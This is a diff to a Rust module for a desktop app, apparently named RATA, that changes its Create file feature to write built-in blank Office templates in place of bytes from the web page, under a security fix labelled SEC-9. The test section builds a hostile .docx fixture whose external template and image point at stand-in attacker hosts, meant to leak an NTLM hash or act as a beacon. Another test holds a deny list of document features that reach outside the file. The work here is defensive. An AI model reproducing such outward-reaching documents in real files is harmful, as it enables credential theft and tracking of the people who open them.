@@ -3,12 +3,22 @@
 //! Numbers, LibreOffice, a text editor); later Send with RATA attaches it as
 //! it is on disk at that moment.
 //!
-//! The page builds the blank file (it already writes .docx and .xlsx) and
-//! hands over its bytes, a format, a name and where to put it. Rust checks
-//! the bytes are that format, cleans the name, picks the folder (Documents /
-//! RATA, or a folder connected in K5), writes a new file there, and keeps a
-//! record of it in the store. The page is given an id, a name and where it
-//! went to show; never a path.
+//! The page names a format, a name and where to put it; never the bytes.
+//! Rust writes its own blank of that format (`Format::blank`: three Office
+//! templates built into RATA from `templates/`, or an empty text file),
+//! cleans the name, picks the folder (Documents / RATA, or a folder
+//! connected in K5), writes a new file there, and keeps a record of it in
+//! the store. The page is given an id, a name and where it went to show;
+//! never a path. Until SEC-9 the page built the file and Rust checked it
+//! (`check_body`), but no check of a stranger's package catches everything
+//! Word acts on when it opens one (a template or picture fetched from
+//! elsewhere, an embedded object, a spreadsheet's link to another file, a
+//! CSV formula), and RATA opens this file at once, unmarked. So the bytes
+//! are RATA's own, and `check_body` stays as the tests' guard on them.
+//!
+//! Create file is Pro's, as connected accounts are (`may_create`): making,
+//! opening and reading for Send with RATA. Listing and forgetting are not,
+//! so a lapsed licence can still tidy up.
 //!
 //! # The one file RATA opens
 //!
@@ -20,9 +30,9 @@
 //! checked every time it is about to (`checked`), never once and trusted
 //! after:
 //!
-//! 1. **RATA made it**, through `create_file`, from bytes that passed
-//!    `check_body`. The page names a file only by the random id RATA gave it
-//!    (`id_ok`), and the record holds the path; the page never supplies one.
+//! 1. **RATA made it**, through `create_file`, from its own blank. The
+//!    page names a file only by the random id RATA gave it (`id_ok`), and
+//!    the record holds the path; the page never supplies one.
 //! 2. **It is still where RATA made it.** The recorded path is canonical,
 //!    and so must the path be now: a file moved, renamed or deleted is not
 //!    opened, and nor is one reached through a folder on the way that has
@@ -61,8 +71,8 @@ use crate::cloud::{Service, root_now};
 use crate::core::{Rata, write_unmarked};
 use crate::store::{Created, now};
 
-/// The most a blank file from the page may be. A blank document is a few
-/// kilobytes; this leaves room for a template with a picture in it.
+/// The most a blank file may be. A blank document is a few kilobytes.
+#[cfg(test)]
 pub const CREATE_MAX: usize = 5 * 1024 * 1024;
 
 /// The sentence for a plan without Create file.
@@ -70,6 +80,12 @@ pub const NEED_PRO_FILES: &str = "Create file comes with RATA Pro. Upgrade at ma
 
 /// The folder inside Documents that Create file uses.
 pub const DOCUMENTS_FOLDER: &str = "RATA";
+
+/// RATA's blank Office files, written by `templates/make.py` and checked
+/// by the tests below (`check_body`, nothing that reaches outside the file).
+const BLANK_DOCX: &[u8] = include_bytes!("../templates/blank.docx");
+const BLANK_XLSX: &[u8] = include_bytes!("../templates/blank.xlsx");
+const BLANK_PPTX: &[u8] = include_bytes!("../templates/blank.pptx");
 
 /// The formats RATA makes, and so the only files it will ever open.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -125,7 +141,20 @@ impl Format {
         }
     }
 
-    /// What the customer calls it, for a sentence.
+    /// The blank file of this format RATA writes: one of the three Office
+    /// templates built into RATA (`templates/`, made by `make.py`), or an
+    /// empty file for the text formats. Never bytes from the page (SEC-9).
+    pub fn blank(self) -> &'static [u8] {
+        match self {
+            Format::Docx => BLANK_DOCX,
+            Format::Xlsx => BLANK_XLSX,
+            Format::Pptx => BLANK_PPTX,
+            Format::Md | Format::Txt | Format::Csv => b"",
+        }
+    }
+
+    /// What the customer calls it, for `check_body`'s sentences.
+    #[cfg(test)]
     fn label(self) -> &'static str {
         match self {
             Format::Docx => "Word document",
@@ -139,6 +168,7 @@ impl Format {
 
     /// The content type `[Content_Types].xml` gives the main part of an
     /// Office Open XML file of this format; none for the text formats.
+    #[cfg(test)]
     fn main_type(self) -> Option<&'static str> {
         match self {
             Format::Docx => Some(
@@ -299,12 +329,17 @@ fn unverbatim(path: &str) -> Option<String> {
 }
 
 // ---------------------------------------------------------------------------
-// What the page hands over.
+// What a blank Office file must be. Before SEC-9 the page handed over the
+// bytes and this checked them; it could not see a relationship that reaches
+// outside the file (`TargetMode="External"`), an embedded object or a
+// spreadsheet's link, so RATA now writes its own blanks (`Format::blank`)
+// and this stays as the tests' guard that those blanks are what they say.
 
 /// Whether `bytes` are a file of `format` RATA will make: at most
 /// `CREATE_MAX`; for .docx, .xlsx and .pptx a zip whose
 /// `[Content_Types].xml` names that format's main part, which is in the
 /// zip, and nothing macro-enabled; for the text formats UTF-8 with no NUL.
+#[cfg(test)]
 pub fn check_body(format: Format, bytes: &[u8]) -> Result<(), FileRefusal> {
     if bytes.len() > CREATE_MAX {
         return Err(refuse(
@@ -331,10 +366,13 @@ pub fn check_body(format: Format, bytes: &[u8]) -> Result<(), FileRefusal> {
 }
 
 /// The most entries a blank document's zip may list.
+#[cfg(test)]
 const ENTRIES_MAX: usize = 1_000;
 /// The most `[Content_Types].xml` may unpack to.
+#[cfg(test)]
 const TYPES_MAX: usize = 1024 * 1024;
 
+#[cfg(test)]
 struct Entry<'a> {
     name: &'a [u8],
     flags: u16,
@@ -344,11 +382,13 @@ struct Entry<'a> {
     local: usize,
 }
 
+#[cfg(test)]
 fn u16_at(b: &[u8], i: usize) -> Option<usize> {
     let s = b.get(i..i.checked_add(2)?)?;
     Some(u16::from_le_bytes([s[0], s[1]]) as usize)
 }
 
+#[cfg(test)]
 fn u32_at(b: &[u8], i: usize) -> Option<usize> {
     let s = b.get(i..i.checked_add(4)?)?;
     Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]) as usize)
@@ -356,6 +396,7 @@ fn u32_at(b: &[u8], i: usize) -> Option<usize> {
 
 /// A zip's central directory, read from its end record. Bounded, checked at
 /// every step, and only what a blank document needs: one disk, no Zip64.
+#[cfg(test)]
 fn zip_entries(b: &[u8]) -> Option<Vec<Entry<'_>>> {
     let last = b.len().checked_sub(22)?;
     let lowest = last.saturating_sub(0xFFFF);
@@ -390,6 +431,7 @@ fn zip_entries(b: &[u8]) -> Option<Vec<Entry<'_>>> {
 
 /// One entry's bytes: stored, or deflated, at most `TYPES_MAX`. Never an
 /// encrypted one.
+#[cfg(test)]
 fn entry_bytes(b: &[u8], e: &Entry<'_>) -> Option<Vec<u8>> {
     if e.flags & 1 != 0 || e.size > TYPES_MAX || u32_at(b, e.local)? != 0x0403_4b50 {
         return None;
@@ -411,6 +453,7 @@ fn entry_bytes(b: &[u8], e: &Entry<'_>) -> Option<Vec<u8>> {
 }
 
 /// The value of attribute `name` in one tag's text, in either quote.
+#[cfg(test)]
 fn attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
     let mut rest = tag;
     while let Some(i) = rest.find(name) {
@@ -435,6 +478,7 @@ fn attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
 }
 
 /// Whether `b` is an Office Open XML file whose main part is `main`.
+#[cfg(test)]
 fn ooxml_ok(b: &[u8], main: &str) -> bool {
     let Some(entries) = zip_entries(b) else {
         return false;
@@ -663,17 +707,17 @@ impl Rata {
     }
 
     /// Create file: make a blank file of `format` named after `name` in
-    /// `place` (`documents`, or `apple`/`adobe` when connected on a plan
-    /// with `connect`), from the page's `bytes`, record it, and open it.
-    /// `docs` is the Documents folder, none when this computer has none.
-    /// Never overwrites; never marks the file as a download. A file that
-    /// could not be opened is still made (`opened: false`, `open_error`).
+    /// `place` (`documents`, or `apple`/`adobe` when connected), from
+    /// RATA's own blank of that format (`Format::blank`), record it, and
+    /// open it. `docs` is the Documents folder, none when this computer has
+    /// none. Never overwrites; never marks the file as a download. A file
+    /// that could not be opened is still made (`opened: false`,
+    /// `open_error`). Needs a plan with `connect` (`may_create`).
     pub fn create_file(
         &self,
         format: &str,
         name: &str,
         place: &str,
-        bytes: &[u8],
         docs: Option<&Path>,
         open: &Opener<'_>,
     ) -> Result<Made, FileRefusal> {
@@ -687,7 +731,7 @@ impl Rata {
         })?;
         let place =
             Place::parse(place).ok_or_else(|| refuse("where", "RATA cannot make a file there."))?;
-        check_body(format, bytes)?;
+        let bytes = format.blank();
         let shown_place = shown(place.key());
         let dir = match place {
             Place::Documents => {
@@ -1135,34 +1179,24 @@ mod tests {
     }
 
     #[test]
-    fn a_refused_body_or_format_writes_nothing() {
+    fn a_refused_format_or_place_writes_nothing() {
         let s = Scratch::new();
         let docs = s.docs();
         let a = app(&s, Some(PRO));
         let fake = Fake::default();
-        let make = |format: &str, place: &str, b: &[u8]| {
-            a.create_file(format, "Plan", place, b, Some(&docs), &|p| fake.open(p))
+        let make = |format: &str, place: &str| {
+            a.create_file(format, "Plan", place, Some(&docs), &|p| fake.open(p))
         };
-        assert_eq!(make("exe", "documents", b"MZ").unwrap_err().kind, "format");
-        assert_eq!(make("docm", "documents", b"x").unwrap_err().kind, "format");
-        assert_eq!(
-            make("docx", "documents", b"MZ").unwrap_err().kind,
-            "invalid"
-        );
-        assert_eq!(
-            make("txt", "documents", &vec![b'a'; CREATE_MAX + 1])
-                .unwrap_err()
-                .kind,
-            "too-large"
-        );
-        assert_eq!(make("txt", "desktop", b"").unwrap_err().kind, "where");
-        assert_eq!(make("txt", "/etc", b"").unwrap_err().kind, "where");
+        assert_eq!(make("exe", "documents").unwrap_err().kind, "format");
+        assert_eq!(make("docm", "documents").unwrap_err().kind, "format");
+        assert_eq!(make("txt", "desktop").unwrap_err().kind, "where");
+        assert_eq!(make("txt", "/etc").unwrap_err().kind, "where");
         assert!(!docs.join(DOCUMENTS_FOLDER).exists());
         assert!(fake.seen().is_empty());
         assert!(a.created_list().is_empty());
         // No Documents folder at all.
         let e = a
-            .create_file("txt", "Plan", "documents", b"", None, &|p| fake.open(p))
+            .create_file("txt", "Plan", "documents", None, &|p| fake.open(p))
             .unwrap_err();
         assert_eq!(e.kind, "disk");
     }
@@ -1207,14 +1241,7 @@ mod tests {
         let fake = Fake::default();
         let marked = crate::core::MARKED.with(|m| m.get());
         let first = a
-            .create_file(
-                "docx",
-                "Plan",
-                "documents",
-                &body(Format::Docx),
-                Some(&docs),
-                &|p| fake.open(p),
-            )
+            .create_file("docx", "Plan", "documents", Some(&docs), &|p| fake.open(p))
             .unwrap();
         assert_eq!(first.name, "Plan.docx");
         assert_eq!(first.place, "Documents / RATA");
@@ -1222,25 +1249,22 @@ mod tests {
         assert_eq!(first.open_error, None);
         assert!(id_ok(&first.id), "{}", first.id);
         let made = docs.join("RATA/Plan.docx");
-        assert_eq!(fs::read(&made).unwrap(), body(Format::Docx));
+        assert_eq!(fs::read(&made).unwrap(), Format::Docx.blank());
         assert_eq!(fake.seen(), std::slice::from_ref(&made));
+        // The customer writes in it.
+        fs::write(&made, b"written in Word").unwrap();
 
         let second = a
-            .create_file(
-                "docx",
-                "Plan.docx",
-                "documents",
-                &blank(Format::Docx, true),
-                Some(&docs),
-                &|p| fake.open(p),
-            )
+            .create_file("docx", "Plan.docx", "documents", Some(&docs), &|p| {
+                fake.open(p)
+            })
             .unwrap();
         assert_eq!(second.name, "Plan (2).docx");
         assert_ne!(second.id, first.id);
-        assert_eq!(fs::read(&made).unwrap(), body(Format::Docx), "untouched");
+        assert_eq!(fs::read(&made).unwrap(), b"written in Word", "untouched");
         assert_eq!(
             fs::read(docs.join("RATA/Plan (2).docx")).unwrap(),
-            blank(Format::Docx, true)
+            Format::Docx.blank()
         );
 
         // Not marked as a download: no write went through the mark...
@@ -1271,14 +1295,9 @@ mod tests {
         let fake = Fake::default();
         let made = {
             let a = app(&s, Some(PRO));
-            a.create_file(
-                "xlsx",
-                "Budget",
-                "documents",
-                &body(Format::Xlsx),
-                Some(&docs),
-                &|p| fake.open(p),
-            )
+            a.create_file("xlsx", "Budget", "documents", Some(&docs), &|p| {
+                fake.open(p)
+            })
             .unwrap()
         };
         let a = app(&s, None);
@@ -1295,7 +1314,7 @@ mod tests {
             (made.id.as_str(), "Budget.xlsx", "xlsx", "Documents / RATA")
         );
         assert!(row.exists);
-        assert_eq!(row.size, Some(body(Format::Xlsx).len() as u64));
+        assert_eq!(row.size, Some(Format::Xlsx.blank().len() as u64));
         assert!(row.modified.is_some());
         let again = a.open_created(&made.id, &|p| fake.open(p)).unwrap();
         assert_eq!(again.name, "Budget.xlsx");
@@ -1305,7 +1324,7 @@ mod tests {
         let got = a.created_read(&made.id).unwrap();
         assert_eq!(got.name, "Budget.xlsx");
         assert_eq!(got.mime, Format::Xlsx.mime());
-        assert_eq!(got.data, body(Format::Xlsx));
+        assert_eq!(got.data, Format::Xlsx.blank());
         // The record in the file holds what the card says, and no more.
         let raw = fs::read_to_string(s.0.join("app/mailboxes.json")).unwrap();
         for field in [
@@ -1327,7 +1346,7 @@ mod tests {
         let docs = s.docs();
         let a = app(&s, Some(PRO));
         let made = a
-            .create_file("txt", "Notes", "documents", b"", Some(&docs), &|_| Ok(()))
+            .create_file("txt", "Notes", "documents", Some(&docs), &|_| Ok(()))
             .unwrap();
         let path = docs.join("RATA/Notes.txt");
         // Edited in the computer's own app since.
@@ -1360,14 +1379,7 @@ mod tests {
         let docs = s.docs();
         let a = app(s, Some(PRO));
         let made = a
-            .create_file(
-                "docx",
-                "Plan",
-                "documents",
-                &body(Format::Docx),
-                Some(&docs),
-                &|_| Ok(()),
-            )
+            .create_file("docx", "Plan", "documents", Some(&docs), &|_| Ok(()))
             .unwrap();
         (a, made.id, docs.join("RATA/Plan.docx"))
     }
@@ -1504,9 +1516,7 @@ mod tests {
         // Delete account forgets every one.
         let (a, id, path) = one(&s);
         let id2 = a
-            .create_file("md", "Notes", "documents", b"# x", Some(&s.docs()), &|_| {
-                Ok(())
-            })
+            .create_file("md", "Notes", "documents", Some(&s.docs()), &|_| Ok(()))
             .unwrap()
             .id;
         a.forget_everything().unwrap();
@@ -1528,14 +1538,7 @@ mod tests {
         let docs = s.docs();
         let a = app(&s, Some(PRO));
         let made = a
-            .create_file(
-                "pptx",
-                "Deck",
-                "documents",
-                &body(Format::Pptx),
-                Some(&docs),
-                &failing,
-            )
+            .create_file("pptx", "Deck", "documents", Some(&docs), &failing)
             .unwrap();
         assert!(!made.opened);
         let why = made.open_error.clone().unwrap();
@@ -1557,9 +1560,7 @@ mod tests {
         let docs = s.docs();
         let fake = Fake::default();
         let make = |a: &Rata, place: &str| {
-            a.create_file("md", "Notes", place, b"# Notes", Some(&docs), &|p| {
-                fake.open(p)
-            })
+            a.create_file("md", "Notes", place, Some(&docs), &|p| fake.open(p))
         };
 
         let none = app(&s, None);
@@ -1582,7 +1583,7 @@ mod tests {
         let made = make(&pro, "apple").unwrap();
         assert_eq!(made.place, "iCloud Drive");
         assert_eq!(made.name, "Notes.md");
-        assert_eq!(fs::read(icloud.join("Notes.md")).unwrap(), b"# Notes");
+        assert_eq!(fs::read(icloud.join("Notes.md")).unwrap(), b"");
         assert_eq!(fake.seen().last(), Some(&icloud.join("Notes.md")));
         let row = pro
             .created_list()
@@ -1606,7 +1607,7 @@ mod tests {
         let ids: Vec<String> = ["One", "Two", "Three"]
             .iter()
             .map(|n| {
-                a.create_file("txt", n, "documents", b"", Some(&docs), &|_| Ok(()))
+                a.create_file("txt", n, "documents", Some(&docs), &|_| Ok(()))
                     .unwrap()
                     .id
             })
@@ -1674,15 +1675,8 @@ mod tests {
         let a = app(&s, Some(PRO));
         a.connect_service("apple", Os::Windows, &home).unwrap();
         let make = |name: &str, place: &str| {
-            a.create_file(
-                "docx",
-                name,
-                place,
-                &body(Format::Docx),
-                Some(&docs),
-                &|_| Ok(()),
-            )
-            .unwrap()
+            a.create_file("docx", name, place, Some(&docs), &|_| Ok(()))
+                .unwrap()
         };
         let invoice = make("Invoice", "apple");
         let first = icloud.join("Invoice.docx");
@@ -1719,6 +1713,155 @@ mod tests {
         assert_eq!(placed.name, "Invoice.docx");
     }
 
+    /// A .docx that passes `check_body` and still reaches out when Word
+    /// opens it: a template and a picture fetched from elsewhere (an NTLM
+    /// hash or a beacon), an embedded object and an ActiveX control.
+    fn hostile_docx() -> Vec<u8> {
+        let types = types_for("word/document.xml", Format::Docx.main_type().unwrap());
+        let rels = r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://attacker@80/t.dotm" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://attacker.example/beacon.png" TargetMode="External"/></Relationships>"#;
+        zip(&[
+            ("[Content_Types].xml", types.as_bytes(), false),
+            ("word/document.xml", b"<x/>", false),
+            ("word/_rels/document.xml.rels", rels.as_bytes(), false),
+            ("word/embeddings/oleObject1.bin", b"ole", false),
+            ("word/activeX/activeX1.xml", b"<x/>", false),
+        ])
+    }
+
+    /// SEC-9 (F1): the file RATA writes is its own blank of the format,
+    /// so a compromised page cannot have RATA write, and open unmarked and
+    /// at once, a document that reaches out. `check_body` alone let one
+    /// through, which is why the page no longer supplies the bytes.
+    #[test]
+    fn a_file_is_made_from_rata_s_own_blank_and_nothing_else() {
+        assert_eq!(check_body(Format::Docx, &hostile_docx()), Ok(()));
+        let s = Scratch::new();
+        let docs = s.docs();
+        let a = app(&s, Some(PRO));
+        for f in FORMATS {
+            let made = a
+                .create_file(f.ext(), "Made", "documents", Some(&docs), &|_| Ok(()))
+                .unwrap();
+            let on_disk = fs::read(docs.join("RATA").join(&made.name)).unwrap();
+            assert!(on_disk == f.blank(), "{f:?}");
+            assert!(a.created_read(&made.id).unwrap().data == f.blank());
+        }
+    }
+
+    /// Where a relationship in `rels` (a `.rels` part's name) points, as a
+    /// part name inside the file.
+    fn rel_target(rels: &str, target: &str) -> String {
+        // `word/_rels/document.xml.rels` speaks for `word/`.
+        let base = rels.rsplit_once("_rels/").map(|(dir, _)| dir).unwrap_or("");
+        let mut parts: Vec<&str> = base.split('/').filter(|p| !p.is_empty()).collect();
+        for step in target.split('/') {
+            match step {
+                ".." => {
+                    parts.pop().expect("a target above the file");
+                }
+                "." | "" => {}
+                p => parts.push(p),
+            }
+        }
+        parts.join("/")
+    }
+
+    /// The three Office blanks are what `check_body` asks of a blank of
+    /// their format and of no other, the text blanks are empty, and none
+    /// holds anything that reaches outside the file or runs.
+    #[test]
+    fn every_blank_passes_the_check_and_holds_nothing_that_reaches_out() {
+        for f in FORMATS {
+            assert_eq!(check_body(f, f.blank()), Ok(()), "{f:?}");
+            for other in [Format::Docx, Format::Xlsx, Format::Pptx] {
+                if other != f {
+                    assert!(check_body(other, f.blank()).is_err(), "{f:?} as {other:?}");
+                }
+            }
+        }
+        for f in [Format::Md, Format::Txt, Format::Csv] {
+            assert!(f.blank().is_empty(), "{f:?}");
+        }
+        let forbidden = [
+            "TargetMode",
+            "External",
+            "embeddings/",
+            "activeX/",
+            "externalLinks/",
+            "vbaProject",
+            "macroEnabled",
+            "oleObject",
+            "attachedTemplate",
+            "file:",
+            "\\\\",
+        ];
+        for f in [Format::Docx, Format::Xlsx, Format::Pptx] {
+            let b = f.blank();
+            let mut parts = Vec::new();
+            for e in zip_entries(b).unwrap() {
+                let name = String::from_utf8(e.name.to_vec()).unwrap();
+                assert_eq!(e.method, 0, "{f:?} {name}: stored, as make.py writes it");
+                let text = String::from_utf8(entry_bytes(b, &e).unwrap()).unwrap();
+                for bad in forbidden {
+                    assert!(!name.contains(bad), "{f:?}: {name}");
+                    assert!(!text.contains(bad), "{f:?}: {bad} in {name}");
+                }
+                parts.push((name, text));
+            }
+            // Every relationship points at a part in the file, every part
+            // is reached by one, and every part has a content type.
+            let has = |part: &str| parts.iter().any(|(n, _)| n == part);
+            let types = &parts
+                .iter()
+                .find(|(n, _)| n == "[Content_Types].xml")
+                .unwrap()
+                .1;
+            let mut reached = vec!["[Content_Types].xml".to_string()];
+            for (name, text) in parts.iter().filter(|(n, _)| n.ends_with(".rels")) {
+                reached.push(name.clone());
+                for (i, _) in text.match_indices("<Relationship ") {
+                    let tag = &text[i..i + text[i..].find('>').unwrap()];
+                    let part = rel_target(name, attr(tag, "Target").unwrap());
+                    assert!(has(&part), "{f:?}: {name} names {part}, not in the file");
+                    reached.push(part);
+                }
+            }
+            for (name, _) in &parts {
+                assert!(reached.contains(name), "{f:?}: nothing reaches {name}");
+                let typed = name.ends_with(".rels")
+                    || name == "[Content_Types].xml"
+                    || types.contains(&format!("PartName=\"/{name}\""));
+                assert!(typed, "{f:?}: {name} has no content type of its own");
+            }
+        }
+        // PowerPoint's least: a presentation, a master, a layout, a theme,
+        // a slide, and the presentation's three property parts.
+        let pptx = zip_entries(Format::Pptx.blank()).unwrap();
+        for part in [
+            "ppt/presentation.xml",
+            "ppt/slideMasters/slideMaster1.xml",
+            "ppt/slideLayouts/slideLayout1.xml",
+            "ppt/slides/slide1.xml",
+            "ppt/theme/theme1.xml",
+            "ppt/presProps.xml",
+            "ppt/viewProps.xml",
+            "ppt/tableStyles.xml",
+        ] {
+            assert!(pptx.iter().any(|e| e.name == part.as_bytes()), "{part}");
+        }
+        assert_eq!(
+            rel_target("_rels/.rels", "word/document.xml"),
+            "word/document.xml"
+        );
+        assert_eq!(
+            rel_target(
+                "ppt/slides/_rels/slide1.xml.rels",
+                "../slideLayouts/slideLayout1.xml"
+            ),
+            "ppt/slideLayouts/slideLayout1.xml"
+        );
+    }
+
     /// SEC-9 (F3): making, opening and reading a file for Send with RATA
     /// are Pro's, as connected accounts are; listing and forgetting are
     /// not, so a lapsed licence can still tidy up.
@@ -1731,9 +1874,7 @@ mod tests {
         let check = |kind: &str, sentence: Option<&str>| {
             let fake = Fake::default();
             let e = a
-                .create_file("txt", "Notes", "documents", b"", Some(&docs), &|p| {
-                    fake.open(p)
-                })
+                .create_file("txt", "Notes", "documents", Some(&docs), &|p| fake.open(p))
                 .unwrap_err();
             assert_eq!(e.kind, kind, "create: {}", e.error);
             if let Some(sentence) = sentence {
@@ -1765,7 +1906,7 @@ mod tests {
         // Back on Pro, a file is made and opened again.
         a.set_licence(Some(PRO.into()), None).unwrap();
         let made = a
-            .create_file("txt", "Notes", "documents", b"", Some(&docs), &|_| Ok(()))
+            .create_file("txt", "Notes", "documents", Some(&docs), &|_| Ok(()))
             .unwrap();
         a.open_created(&made.id, &|_| Ok(())).unwrap();
         a.created_read(&made.id).unwrap();
